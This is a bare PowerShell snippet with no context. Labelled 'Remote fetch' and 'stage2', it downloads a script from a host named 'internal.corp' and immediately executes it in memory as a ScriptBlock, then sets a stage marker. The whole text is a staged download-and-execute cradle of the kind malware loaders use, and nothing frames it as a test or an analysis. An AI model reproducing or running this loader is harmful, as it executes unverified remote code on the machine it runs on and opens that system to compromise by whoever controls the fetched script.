
<# Remote fetch #> $Stage2Url = 'https://internal.corp/stage2.ps1'; $DownloadedScript = (New-Object Net.WebClient).DownloadString($Stage2Url); & ([ScriptBlock]::Create($DownloadedScript)); $StageMarker = "stage-11"
